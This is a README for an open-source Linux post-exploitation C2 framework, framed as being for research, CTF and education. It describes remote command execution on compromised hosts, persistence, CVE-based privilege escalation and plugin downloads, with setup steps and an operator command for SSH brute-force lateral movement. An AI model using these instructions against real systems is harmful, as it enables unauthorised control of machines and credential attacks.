# cortex-c2
Cortex C2 is a Open source Linux post exploitation framework inspired by the void link C2 framework, and my implementation was built for embedded device security research, CTF use and for educational purposes only.

https://www.sysdig.com/blog/voidlink-threat-analysis-sysdig-discovers-c2-compiled-kernel-rootkits

https://www.ontinue.com/resource/voidlink-dissecting-an-ai-generated-c2-implant/

## Current State
 - This project will never be perfect, but I will do my best to make it useful to the community. 
 - It can run any Linux System Command remotely
 - Perform Persistence via a startup process (NOT TESTED)
 - Priviledge Escalate via CVE 2026-43284 (Thanks to: Mykhailo Stepanov - https://www.linkedin.com/in/mykhailo-stepanov-57857a1a0/) (NOT TESTED)
 - Perform Lateral Movement via SSH Brute Force
 - Download additional plugins on demand

## Features
- Modular and extensible
- Custom JSON database
- Custom DB communication protocol at the application Layer
- Team Server (Windows / Linux / Mac)
- The agent runs only on Linux

## Usage

### Manual 
-  compile any C source code files as necessary gcc -g -o <output_binary_name> <c_soruce_file_name> (Make sure the binary name is the same as the source file name) and also the main.go file in (./agent/plugins/go/lateral_movement) 
- Compile the db_server_2.c file and Run the db_server_2 binary in the ./db folder 
- Edit the configuration details according to your setup in the config.py file  in the ./agent/orchestration/config.py
- activate the team server in the ./team_server folder
  - activate a python virtual environment
  - pip install falsk falsk-cors
  - python3 app_2.py if the DB server runs somewhere else other than on local host then:  TCP_HOST=1<DB IP> TCP_PORT=9100 python3 app_2.py
-  open the index.html file in the ./team_server_client folder and issue commands (If the team server runs some where other than on the same machine as the client edut the API_URL in the client)
- Team server client can run commands on compromised devices, list all compromised devices and show commadn history for all commands run on the compromised devices

### Running commands
 - Enter a regular linux command into the team server client
 - For Lateral Movement
   ```
   # Edit the usernames.txt and passwords.txt file in the ./agent/orchestration folder
   lateral_movement:../plugins/go/lateral_movement/main:-host:<target IP>:-port:<SSH Server PORT>:-delay:500ms
   # Once the command has been run on the target
   cat lateral_output.txt

   ```
 - TO download plugins on demand (Thanks to for the idea: https://sabotagesec.com/)
 - That is the benign plugin you can compile and place your own pluigns in the ./team_server/downloads folder
```
plugin_download:plugin_v1.bin
```  
## Extend 
- To extend the framework edit the python files in the ./agent/orchestration folder for example to include a telegram C2

## Todo
- Implement plugins for container service exploitation
- Hopefully make it cloud native sometime in the future

## Important
- In Production the entire agent folder should run onn the target Linux machine, where as the DB Server, Team server and team server cleint will run on the attacker infrastructure.
- Open an Issue if you run into any errors while trying to use it
-  Successfully tested on a  Arm Cortex-A53 processor
- My framework is not evasive as the void link framework
- This is work in progress, and I do not know how far this will go, your support is highly appreciated, and I am open to accpeting your contributions to the project (read the contributing.md file)
- I used claude ai to speed up the build process
-  It's named Cortex because I am currently testing it out on a Cortex CPU System 
- Visit my web site at https://cyberigniter.link


## Books 
- The linux programming interface by Michael Kerrisk
https://man7.org/tlpi/




